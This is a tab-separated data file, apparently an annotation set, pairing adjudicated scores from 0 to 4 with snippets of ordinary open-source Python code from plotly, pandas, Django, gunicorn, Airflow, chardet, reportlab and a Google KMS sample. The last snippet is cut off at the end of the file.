313	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""scatterpolar.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
82	adjudicated	2	"import numpy as np<<NEWL>>import pytest<<NEWL>><<NEWL>>import pandas as pd<<NEWL>>import pandas._testing as tm<<NEWL>>from pandas.core.arrays import FloatingArray<<NEWL>>from pandas.tests.arrays.masked_shared import (<<NEWL>>    ComparisonOps,<<NEWL>>    NumericOps,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>class TestComparisonOps(NumericOps, ComparisonOps):<<NEWL>>    @pytest.mark.parametrize(""other"", [True, False, pd.NA, -1.0, 0.0, 1])<<NEWL>>    def test_scalar(self, other, comparison_op, dtype):<<NEWL>>        ComparisonOps.test_scalar(self, other, comparison_op, dtype)<<NEWL>><<NEWL>>    def test_compare_with_integerarray(self, comparison_op):<<NEWL>>        op = comparison_op<<NEWL>>        a = pd.array([0, 1, None] * 3, dtype=""Int64"")<<NEWL>>        b = pd.array([0] * 3 + [1] * 3 + [None] * 3, dtype=""Float64"")<<NEWL>>        other = b.astype(""Int64"")<<NEWL>>        expected = op(a, other)<<NEWL>>        result = op(a, b)<<NEWL>>        tm.assert_extension_array_equal(result, expected)<<NEWL>>        expected = op(other, a)<<NEWL>>        result = op(b, a)<<NEWL>>        tm.assert_extension_array_equal(result, expected)<<NEWL>><<NEWL>><<NEWL>>def test_equals():<<NEWL>>    # GH-30652<<NEWL>>    # equals is generally tested in /tests/extension/base/methods, but this<<NEWL>>    # specifically tests that two arrays of the same class but different dtype<<NEWL>>    # do not evaluate equal<<NEWL>>    a1 = pd.array([1, 2, None], dtype=""Float64"")<<NEWL>>    a2 = pd.array([1, 2, None], dtype=""Float32"")<<NEWL>>    assert a1.equals(a2) is False<<NEWL>><<NEWL>><<NEWL>>def test_equals_nan_vs_na():<<NEWL>>    # GH#44382<<NEWL>><<NEWL>>    mask = np.zeros(3, dtype=bool)<<NEWL>>    data = np.array([1.0, np.nan, 3.0], dtype=np.float64)<<NEWL>><<NEWL>>    left = FloatingArray(data, mask)<<NEWL>>    assert left.equals(left)<<NEWL>>    tm.assert_extension_array_equal(left, left)<<NEWL>><<NEWL>>    assert left.equals(left.copy())<<NEWL>>    assert left.equals(FloatingArray(data.copy(), mask.copy()))<<NEWL>><<NEWL>>    mask2 = np.array([False, True, False], dtype=bool)<<NEWL>>    data2 = np.array([1.0, 2.0, 3.0], dtype=np.float64)<<NEWL>>    right = FloatingArray(data2, mask2)<<NEWL>>    assert right.equals(right)<<NEWL>>    tm.assert_extension_array_equal(right, right)<<NEWL>><<NEWL>>    assert not left.equals(right)<<NEWL>><<NEWL>>    # with mask[1] = True, the only difference is data[1], which should<<NEWL>>    #  not matter for equals<<NEWL>>    mask[1] = True<<NEWL>>    assert left.equals(right)"
342	adjudicated	0	"from playwright.sync_api import sync_playwright<<NEWL>>import pandas as pd<<NEWL>>import numpy as np<<NEWL>><<NEWL>>def pagina_min_fazenda(cidade, estado, pagina):<<NEWL>>    pagina.goto(""https://www.airbnb.com.br/"")<<NEWL>><<NEWL>><<NEWL>>    #FAZENDO A PESQUISA <<NEWL>>    pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/<<NEWL>>    header/div/div[2]/div[1]/div/button[1]''').click()<<NEWL>>    pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/<<NEWL>>    header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[1]/div/label/div/input''').fill(cidade + ', ' + estado)<<NEWL>>    if cidade in pagina.locator('''/html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[1]/div/div[2]/div''').inner_text():<<NEWL>>        pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[1]/div/div[2]/div''').locator('nth = 0').click()<<NEWL>>        pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[3]/div[2]/div/div/section/div/div/div/div/div[1]/div/div[1]/div/button[2]''').click()<<NEWL>>        pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[3]/div[2]/div/div/section/div/div/div/div/div[2]/div[2]/div/div[1]/div[2]/div[2]/label''').click()<<NEWL>>        pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[5]/div[1]/div[2]/button/div/div[1]/svg''').click()<<NEWL>><<NEWL>><<NEWL>>    return <<NEWL>>with sync_playwright() as p:<<NEWL>>    <<NEWL>>    navegador = p.chromium.launch(headless = False)<<NEWL>>    pagina = navegador.new_page(viewport = {'width': 1200, 'height': 800})"
202	adjudicated	4	"#<<NEWL>>""""""<<NEWL>>This is a utility to 'can' the widths data for certain CID fonts.<<NEWL>>Now we're using Unicode, we don't need 20 CMAP files for each Asian<<NEWL>>language, nor the widths of the non-normal characters encoded in each<<NEWL>>font.  we just want a dictionary of the character widths in a given<<NEWL>>font which are NOT 1000 ems wide, keyed on Unicode character (not CID).<<NEWL>><<NEWL>>Running off CMAP files we get the following widths...::<<NEWL>><<NEWL>>    >>> font = UnicodeCIDFont('HeiseiMin-W3')<<NEWL>>    >>> font.stringWidth(unicode(','), 10)<<NEWL>>    2.5<<NEWL>>    >>> font.stringWidth(unicode('m'), 10)<<NEWL>>    7.7800000000000002<<NEWL>>    >>> font.stringWidth(u'\u6771\u4EAC', 10)<<NEWL>>    20.0<<NEWL>>    >>> <<NEWL>><<NEWL>>""""""<<NEWL>><<NEWL>>from pprint import pprint as pp<<NEWL>><<NEWL>>from reportlab.pdfbase._cidfontdata import defaultUnicodeEncodings<<NEWL>>from reportlab.pdfbase.cidfonts import UnicodeCIDFont<<NEWL>><<NEWL>><<NEWL>>def run():<<NEWL>><<NEWL>>    buf = []<<NEWL>>    buf.append('widthsByUnichar = {}')<<NEWL>>    for fontName, (language, encName) in defaultUnicodeEncodings.items():<<NEWL>>        print('handling %s : %s : %s' % (fontName, language, encName))<<NEWL>><<NEWL>>        #this does just about all of it for us, as all the info<<NEWL>>        #we need is present.<<NEWL>>        font = UnicodeCIDFont(fontName)<<NEWL>><<NEWL>>        widthsByCID = font.face._explicitWidths<<NEWL>>        cmap = font.encoding._cmap<<NEWL>>        nonStandardWidthsByUnichar = {}<<NEWL>>        for codePoint, cid in cmap.items():<<NEWL>>            width = widthsByCID.get(cid, 1000)<<NEWL>>            if width != 1000:<<NEWL>>                nonStandardWidthsByUnichar[chr(codePoint)] = width<<NEWL>>        <<NEWL>><<NEWL>>        <<NEWL>>        print('created font width map (%d items).  ' % len(nonStandardWidthsByUnichar))<<NEWL>><<NEWL>>        buf.append('widthsByUnichar[""%s""] = %s' % (fontName, repr(nonStandardWidthsByUnichar)))<<NEWL>>        <<NEWL>>        <<NEWL>>    src = '\n'.join(buf) + '\n'<<NEWL>>    open('canned_widths.py','w').write(src)<<NEWL>>    print('wrote canned_widths.py')<<NEWL>><<NEWL>>if __name__=='__main__':<<NEWL>>    run()<<NEWL>>    "
193	adjudicated	3	"import types<<NEWL>>from abc import ABCMeta, abstractmethod<<NEWL>>from collections.abc import AsyncGenerator, Iterable<<NEWL>>from typing import Any, Callable, Coroutine, Dict, Optional, Type, TypeVar<<NEWL>><<NEWL>>_T = TypeVar(""_T"")<<NEWL>><<NEWL>><<NEWL>>class TestRunner(metaclass=ABCMeta):<<NEWL>>    """"""<<NEWL>>    Encapsulates a running event loop. Every call made through this object will use the same event<<NEWL>>    loop.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __enter__(self) -> ""TestRunner"":<<NEWL>>        return self<<NEWL>><<NEWL>>    def __exit__(<<NEWL>>        self,<<NEWL>>        exc_type: Optional[Type[BaseException]],<<NEWL>>        exc_val: Optional[BaseException],<<NEWL>>        exc_tb: Optional[types.TracebackType],<<NEWL>>    ) -> Optional[bool]:<<NEWL>>        self.close()<<NEWL>>        return None<<NEWL>><<NEWL>>    @abstractmethod<<NEWL>>    def close(self) -> None:<<NEWL>>        """"""Close the event loop.""""""<<NEWL>><<NEWL>>    @abstractmethod<<NEWL>>    def run_asyncgen_fixture(<<NEWL>>        self,<<NEWL>>        fixture_func: Callable[..., ""AsyncGenerator[_T, Any]""],<<NEWL>>        kwargs: Dict[str, Any],<<NEWL>>    ) -> ""Iterable[_T]"":<<NEWL>>        """"""<<NEWL>>        Run an async generator fixture.<<NEWL>><<NEWL>>        :param fixture_func: the fixture function<<NEWL>>        :param kwargs: keyword arguments to call the fixture function with<<NEWL>>        :return: an iterator yielding the value yielded from the async generator<<NEWL>>        """"""<<NEWL>><<NEWL>>    @abstractmethod<<NEWL>>    def run_fixture(<<NEWL>>        self,<<NEWL>>        fixture_func: Callable[..., Coroutine[Any, Any, _T]],<<NEWL>>        kwargs: Dict[str, Any],<<NEWL>>    ) -> _T:<<NEWL>>        """"""<<NEWL>>        Run an async fixture.<<NEWL>><<NEWL>>        :param fixture_func: the fixture function<<NEWL>>        :param kwargs: keyword arguments to call the fixture function with<<NEWL>>        :return: the return value of the fixture function<<NEWL>>        """"""<<NEWL>><<NEWL>>    @abstractmethod<<NEWL>>    def run_test(<<NEWL>>        self, test_func: Callable[..., Coroutine[Any, Any, Any]], kwargs: Dict[str, Any]<<NEWL>>    ) -> None:<<NEWL>>        """"""<<NEWL>>        Run an async test function.<<NEWL>><<NEWL>>        :param test_func: the test function<<NEWL>>        :param kwargs: keyword arguments to call the test function with<<NEWL>>        """""""
20	adjudicated	3	"from airflow.models import Variable<<NEWL>>from os import getenv, path<<NEWL>>from datetime import datetime<<NEWL>>from airflow import DAG<<NEWL>>from airflow.providers.cncf.kubernetes.operators.spark_kubernetes import SparkKubernetesOperator<<NEWL>>from airflow.providers.cncf.kubernetes.sensors.spark_kubernetes import SparkKubernetesSensor<<NEWL>>from airflow.providers.cncf.kubernetes.operators.kubernetes_pod import KubernetesPodOperator<<NEWL>><<NEWL>># [START env_variables]<<NEWL>>SPARK_NAMESPACE = getenv(""SPARK_NAMESPACE"", ""processing"")<<NEWL>># [END env_variables]<<NEWL>><<NEWL>># [START env_variables]<<NEWL>>DAGS_FOLDER_PATH = path.dirname(__file__)<<NEWL>># [END env_variables]<<NEWL>><<NEWL>># [START instantiate_dag]<<NEWL>>with DAG(<<NEWL>>    dag_id='pipeline_combustiveis',<<NEWL>>    schedule_interval=None,<<NEWL>>    start_date=datetime(2023, 1, 20),<<NEWL>>    catchup=False,<<NEWL>>    max_active_runs=1,<<NEWL>>    tags=['combustiveis', 'kubernetes-pod-operator', 'spark-operator', 'k8s'],<<NEWL>>) as dag:<<NEWL>># [END instantiate_dag]<<NEWL>><<NEWL>>    ingestion = KubernetesPodOperator(<<NEWL>>        task_id=""ingestion"",<<NEWL>>        name=""combustiveis-ingestion"",<<NEWL>>        is_delete_operator_pod=True,<<NEWL>>        namespace=SPARK_NAMESPACE,<<NEWL>>        startup_timeout_seconds=120,<<NEWL>>        pod_template_file=f""{DAGS_FOLDER_PATH}/pipeline-combustiveis-ingestion.yaml"",<<NEWL>>        in_cluster=True,<<NEWL>>        get_logs=True,<<NEWL>>        env_vars= {<<NEWL>>            ""SOURCE_URLS"" : Variable.get(""combustiveis_source_urls"")<<NEWL>>        }<<NEWL>>    )<<NEWL>><<NEWL>>    # use spark-on-k8s to operate against the data<<NEWL>>    # containerized spark application<<NEWL>>    # yaml definition to trigger process<<NEWL>>    processing = SparkKubernetesOperator(<<NEWL>>        task_id='processing',<<NEWL>>        namespace=SPARK_NAMESPACE,<<NEWL>>        application_file='pipeline-combustiveis-processing.yaml',<<NEWL>>        do_xcom_push=True<<NEWL>>    )<<NEWL>><<NEWL>>    # monitor spark application<<NEWL>>    # using sensor to determine the outcome of the task<<NEWL>>    # read     from xcom tp check the status [key & value] pair<<NEWL>>    processing_status = SparkKubernetesSensor(<<NEWL>>        task_id='processing_status',<<NEWL>>        namespace=SPARK_NAMESPACE,<<NEWL>>        application_name=""{{ task_instance.xcom_pull(task_ids='processing')['metadata']['name']}}"",<<NEWL>>        attach_log=True<<NEWL>>    )<<NEWL>><<NEWL>>    # [START task_sequence]<<NEWL>>    ingestion >> processing >> processing_status<<NEWL>>    # [END task_sequence]"
160	adjudicated	0	"######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is mozilla.org code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 1998<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .mbcharsetprober import MultiByteCharSetProber<<NEWL>>from .codingstatemachine import CodingStateMachine<<NEWL>>from .chardistribution import GB2312DistributionAnalysis<<NEWL>>from .mbcssm import GB2312_SM_MODEL<<NEWL>><<NEWL>><<NEWL>>class GB2312Prober(MultiByteCharSetProber):<<NEWL>>    def __init__(self):<<NEWL>>        super(GB2312Prober, self).__init__()<<NEWL>>        self.coding_sm = CodingStateMachine(GB2312_SM_MODEL)<<NEWL>>        self.distribution_analyzer = GB2312DistributionAnalysis()<<NEWL>>        self.reset()<<NEWL>><<NEWL>>    @property<<NEWL>>    def charset_name(self):<<NEWL>>        return ""GB2312""<<NEWL>><<NEWL>>    @property<<NEWL>>    def language(self):<<NEWL>>        return ""Chinese"""
71	adjudicated	1	"# -*- coding: utf-8 -<<NEWL>>#<<NEWL>># This file is part of gunicorn released under the MIT license.<<NEWL>># See the NOTICE for more information.<<NEWL>><<NEWL>>import configparser<<NEWL>>import os<<NEWL>><<NEWL>>from paste.deploy import loadapp<<NEWL>><<NEWL>>from gunicorn.app.wsgiapp import WSGIApplication<<NEWL>>from gunicorn.config import get_default_config_file<<NEWL>><<NEWL>><<NEWL>>def get_wsgi_app(config_uri, name=None, defaults=None):<<NEWL>>    if ':' not in config_uri:<<NEWL>>        config_uri = ""config:%s"" % config_uri<<NEWL>><<NEWL>>    return loadapp(<<NEWL>>        config_uri,<<NEWL>>        name=name,<<NEWL>>        relative_to=os.getcwd(),<<NEWL>>        global_conf=defaults,<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def has_logging_config(config_file):<<NEWL>>    parser = configparser.ConfigParser()<<NEWL>>    parser.read([config_file])<<NEWL>>    return parser.has_section('loggers')<<NEWL>><<NEWL>><<NEWL>>def serve(app, global_conf, **local_conf):<<NEWL>>    """"""\<<NEWL>>    A Paste Deployment server runner.<<NEWL>><<NEWL>>    Example configuration:<<NEWL>><<NEWL>>        [server:main]<<NEWL>>        use = egg:gunicorn#main<<NEWL>>        host = 127.0.0.1<<NEWL>>        port = 5000<<NEWL>>    """"""<<NEWL>>    config_file = global_conf['__file__']<<NEWL>>    gunicorn_config_file = local_conf.pop('config', None)<<NEWL>><<NEWL>>    host = local_conf.pop('host', '')<<NEWL>>    port = local_conf.pop('port', '')<<NEWL>>    if host and port:<<NEWL>>        local_conf['bind'] = '%s:%s' % (host, port)<<NEWL>>    elif host:<<NEWL>>        local_conf['bind'] = host.split(',')<<NEWL>><<NEWL>>    class PasterServerApplication(WSGIApplication):<<NEWL>>        def load_config(self):<<NEWL>>            self.cfg.set(""default_proc_name"", config_file)<<NEWL>><<NEWL>>            if has_logging_config(config_file):<<NEWL>>                self.cfg.set(""logconfig"", config_file)<<NEWL>><<NEWL>>            if gunicorn_config_file:<<NEWL>>                self.load_config_from_file(gunicorn_config_file)<<NEWL>>            else:<<NEWL>>                default_gunicorn_config_file = get_default_config_file()<<NEWL>>                if default_gunicorn_config_file is not None:<<NEWL>>                    self.load_config_from_file(default_gunicorn_config_file)<<NEWL>><<NEWL>>            for k, v in local_conf.items():<<NEWL>>                if v is not None:<<NEWL>>                    self.cfg.set(k.lower(), v)<<NEWL>><<NEWL>>        def load(self):<<NEWL>>            return app<<NEWL>><<NEWL>>    PasterServerApplication().run()"
131	adjudicated	2	"# -*- coding: utf-8 -*-<<NEWL>>from django import template<<NEWL>><<NEWL>>register = template.Library()<<NEWL>><<NEWL>><<NEWL>>class IndentByNode(template.Node):<<NEWL>>    def __init__(self, nodelist, indent_level, if_statement):<<NEWL>>        self.nodelist = nodelist<<NEWL>>        self.indent_level = template.Variable(indent_level)<<NEWL>>        if if_statement:<<NEWL>>            self.if_statement = template.Variable(if_statement)<<NEWL>>        else:<<NEWL>>            self.if_statement = None<<NEWL>><<NEWL>>    def render(self, context):<<NEWL>>        indent_level = self.indent_level.resolve(context)<<NEWL>>        if self.if_statement:<<NEWL>>            try:<<NEWL>>                if_statement = bool(self.if_statement.resolve(context))<<NEWL>>            except template.VariableDoesNotExist:<<NEWL>>                if_statement = False<<NEWL>>        else:<<NEWL>>            if_statement = True<<NEWL>>        output = self.nodelist.render(context)<<NEWL>>        if if_statement:<<NEWL>>            indent = "" "" * indent_level<<NEWL>>            output = indent + indent.join(output.splitlines(True))<<NEWL>>        return output<<NEWL>><<NEWL>><<NEWL>>@register.tag<<NEWL>>def indentby(parser, token):<<NEWL>>    """"""<<NEWL>>    Add indentation to text between the tags by the given indentation level.<<NEWL>><<NEWL>>    {% indentby <indent_level> [if <statement>] %}<<NEWL>>    ...<<NEWL>>    {% endindentby %}<<NEWL>><<NEWL>>    Arguments:<<NEWL>>      indent_level - Number of spaces to indent text with.<<NEWL>>      statement - Only apply indent_level if the boolean statement evalutates to True.<<NEWL>>    """"""<<NEWL>>    args = token.split_contents()<<NEWL>>    largs = len(args)<<NEWL>>    if largs not in (2, 4):<<NEWL>>        raise template.TemplateSyntaxError(""indentby tag requires 1 or 3 arguments"")<<NEWL>>    indent_level = args[1]<<NEWL>>    if_statement = None<<NEWL>>    if largs == 4:<<NEWL>>        if_statement = args[3]<<NEWL>>    nodelist = parser.parse(('endindentby', ))<<NEWL>>    parser.delete_first_token()<<NEWL>>    return IndentByNode(nodelist, indent_level, if_statement)"
120	adjudicated	3	"from functools import wraps<<NEWL>><<NEWL>>from django.middleware.csrf import CsrfViewMiddleware, get_token<<NEWL>>from django.utils.decorators import decorator_from_middleware<<NEWL>><<NEWL>>csrf_protect = decorator_from_middleware(CsrfViewMiddleware)<<NEWL>>csrf_protect.__name__ = ""csrf_protect""<<NEWL>>csrf_protect.__doc__ = """"""<<NEWL>>This decorator adds CSRF protection in exactly the same way as<<NEWL>>CsrfViewMiddleware, but it can be used on a per view basis.  Using both, or<<NEWL>>using the decorator multiple times, is harmless and efficient.<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>class _EnsureCsrfToken(CsrfViewMiddleware):<<NEWL>>    # Behave like CsrfViewMiddleware but don't reject requests or log warnings.<<NEWL>>    def _reject(self, request, reason):<<NEWL>>        return None<<NEWL>><<NEWL>><<NEWL>>requires_csrf_token = decorator_from_middleware(_EnsureCsrfToken)<<NEWL>>requires_csrf_token.__name__ = ""requires_csrf_token""<<NEWL>>requires_csrf_token.__doc__ = """"""<<NEWL>>Use this decorator on views that need a correct csrf_token available to<<NEWL>>RequestContext, but without the CSRF protection that csrf_protect<<NEWL>>enforces.<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>class _EnsureCsrfCookie(CsrfViewMiddleware):<<NEWL>>    def _reject(self, request, reason):<<NEWL>>        return None<<NEWL>><<NEWL>>    def process_view(self, request, callback, callback_args, callback_kwargs):<<NEWL>>        retval = super().process_view(request, callback, callback_args, callback_kwargs)<<NEWL>>        # Force process_response to send the cookie<<NEWL>>        get_token(request)<<NEWL>>        return retval<<NEWL>><<NEWL>><<NEWL>>ensure_csrf_cookie = decorator_from_middleware(_EnsureCsrfCookie)<<NEWL>>ensure_csrf_cookie.__name__ = ""ensure_csrf_cookie""<<NEWL>>ensure_csrf_cookie.__doc__ = """"""<<NEWL>>Use this decorator to ensure that a view sets a CSRF cookie, whether or not it<<NEWL>>uses the csrf_token template tag, or the CsrfViewMiddleware is used.<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>def csrf_exempt(view_func):<<NEWL>>    """"""Mark a view function as being exempt from the CSRF view protection.""""""<<NEWL>><<NEWL>>    # view_func.csrf_exempt = True would also work, but decorators are nicer<<NEWL>>    # if they don't have side effects, so return a new function.<<NEWL>>    def wrapped_view(*args, **kwargs):<<NEWL>>        return view_func(*args, **kwargs)<<NEWL>><<NEWL>>    wrapped_view.csrf_exempt = True<<NEWL>>    return wraps(view_func)(wrapped_view)"
60	adjudicated	4	"""""""<<NEWL>> This module houses ctypes interfaces for GDAL objects.  The following GDAL<<NEWL>> objects are supported:<<NEWL>><<NEWL>> CoordTransform: Used for coordinate transformations from one spatial<<NEWL>>  reference system to another.<<NEWL>><<NEWL>> Driver: Wraps an OGR data source driver.<<NEWL>><<NEWL>> DataSource: Wrapper for the OGR data source object, supports<<NEWL>>  OGR-supported data sources.<<NEWL>><<NEWL>> Envelope: A ctypes structure for bounding boxes (GDAL library<<NEWL>>  not required).<<NEWL>><<NEWL>> OGRGeometry: Object for accessing OGR Geometry functionality.<<NEWL>><<NEWL>> OGRGeomType: A class for representing the different OGR Geometry<<NEWL>>  types (GDAL library not required).<<NEWL>><<NEWL>> SpatialReference: Represents OSR Spatial Reference objects.<<NEWL>><<NEWL>> The GDAL library will be imported from the system path using the default<<NEWL>> library name for the current OS. The default library path may be overridden<<NEWL>> by setting `GDAL_LIBRARY_PATH` in your settings with the path to the GDAL C<<NEWL>> library on your system.<<NEWL>>""""""<<NEWL>>from django.contrib.gis.gdal.datasource import DataSource<<NEWL>>from django.contrib.gis.gdal.driver import Driver<<NEWL>>from django.contrib.gis.gdal.envelope import Envelope<<NEWL>>from django.contrib.gis.gdal.error import GDALException, SRSException, check_err<<NEWL>>from django.contrib.gis.gdal.geometries import OGRGeometry<<NEWL>>from django.contrib.gis.gdal.geomtype import OGRGeomType<<NEWL>>from django.contrib.gis.gdal.libgdal import (<<NEWL>>    GDAL_VERSION,<<NEWL>>    gdal_full_version,<<NEWL>>    gdal_version,<<NEWL>>)<<NEWL>>from django.contrib.gis.gdal.raster.source import GDALRaster<<NEWL>>from django.contrib.gis.gdal.srs import AxisOrder, CoordTransform, SpatialReference<<NEWL>><<NEWL>>__all__ = (<<NEWL>>    ""AxisOrder"",<<NEWL>>    ""Driver"",<<NEWL>>    ""DataSource"",<<NEWL>>    ""CoordTransform"",<<NEWL>>    ""Envelope"",<<NEWL>>    ""GDALException"",<<NEWL>>    ""GDALRaster"",<<NEWL>>    ""GDAL_VERSION"",<<NEWL>>    ""OGRGeometry"",<<NEWL>>    ""OGRGeomType"",<<NEWL>>    ""SpatialReference"",<<NEWL>>    ""SRSException"",<<NEWL>>    ""check_err"",<<NEWL>>    ""gdal_version"",<<NEWL>>    ""gdal_full_version"",<<NEWL>>)"
171	adjudicated	3	"# Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>><<NEWL>><<NEWL>># [START kms_create_key_labels]<<NEWL>>def create_key_labels(project_id, location_id, key_ring_id, key_id):<<NEWL>>    """"""<<NEWL>>    Creates a new key in Cloud KMS with labels.<<NEWL>><<NEWL>>    Args:<<NEWL>>        project_id (string): Google Cloud project ID (e.g. 'my-project').<<NEWL>>        location_id (string): Cloud KMS location (e.g. 'us-east1').<<NEWL>>        key_ring_id (string): ID of the Cloud KMS key ring (e.g. 'my-key-ring').<<NEWL>>        key_id (string): ID of the key to create (e.g. 'my-labeled-key').<<NEWL>><<NEWL>>    Returns:<<NEWL>>        CryptoKey: Cloud KMS key.<<NEWL>><<NEWL>>    """"""<<NEWL>><<NEWL>>    # Import the client library.<<NEWL>>    from google.cloud import kms<<NEWL>><<NEWL>>    # Create the client.<<NEWL>>    client = kms.KeyManagementServiceClient()<<NEWL>><<NEWL>>    # Build the parent key ring name.<<NEWL>>    key_ring_name = client.key_ring_path(project_id, location_id, key_ring_id)<<NEWL>><<NEWL>>    # Build the key.<<NEWL>>    purpose = kms.CryptoKey.CryptoKeyPurpose.ENCRYPT_DECRYPT<<NEWL>>    algorithm = kms.CryptoKeyVersion.CryptoKeyVersionAlgorithm.GOOGLE_SYMMETRIC_ENCRYPTION<<NEWL>>    key = {<<NEWL>>        'purpose': purpose,<<NEWL>>        'version_template': {<<NEWL>>            'algorithm': algorithm,<<NEWL>>        },<<NEWL>>        'labels': {<<NEWL>>            'team': 'alpha',<<NEWL>>            'cost_center': 'cc1234'<<NEWL>>        }<<NEWL>>    }<<NEWL>><<NEWL>>    # Call the API.<<NEWL>>    created_key = client.create_crypto_key(<<NEWL>>        request={'parent': key_ring_name, 'crypto_key_id': key_id, 'crypto_key': key})<<NEWL>>    print('Created labeled key: {}'.format(created_key.name))<<NEWL>>    return created_key<<NEWL>># [END kms_create_key_labels]"
31	adjudicated	1	"from pathlib import Path<<NEWL>><<NEWL>>from django.dispatch import receiver<<NEWL>>from django.template import engines<<NEWL>>from django.template.backends.django import DjangoTemplates<<NEWL>>from django.utils._os import to_path<<NEWL>>from django.utils.autoreload import autoreload_started, file_changed, is_django_path<<NEWL>><<NEWL>><<NEWL>>def get_template_directories():<<NEWL>>    # Iterate through each template backend and find<<NEWL>>    # any template_loader that has a 'get_dirs' method.<<NEWL>>    # Collect the directories, filtering out Django templates.<<NEWL>>    cwd = Path.cwd()<<NEWL>>    items = set()<<NEWL>>    for backend in engines.all():<<NEWL>>        if not isinstance(backend, DjangoTemplates):<<NEWL>>            continue<<NEWL>><<NEWL>>        items.update(cwd / to_path(dir) for dir in backend.engine.dirs if dir)<<NEWL>><<NEWL>>        for loader in backend.engine.template_loaders:<<NEWL>>            if not hasattr(loader, ""get_dirs""):<<NEWL>>                continue<<NEWL>>            items.update(<<NEWL>>                cwd / to_path(directory)<<NEWL>>                for directory in loader.get_dirs()<<NEWL>>                if directory and not is_django_path(directory)<<NEWL>>            )<<NEWL>>    return items<<NEWL>><<NEWL>><<NEWL>>def reset_loaders():<<NEWL>>    for backend in engines.all():<<NEWL>>        if not isinstance(backend, DjangoTemplates):<<NEWL>>            continue<<NEWL>>        for loader in backend.engine.template_loaders:<<NEWL>>            loader.reset()<<NEWL>><<NEWL>><<NEWL>>@receiver(autoreload_started, dispatch_uid=""template_loaders_watch_changes"")<<NEWL>>def watch_for_template_changes(sender, 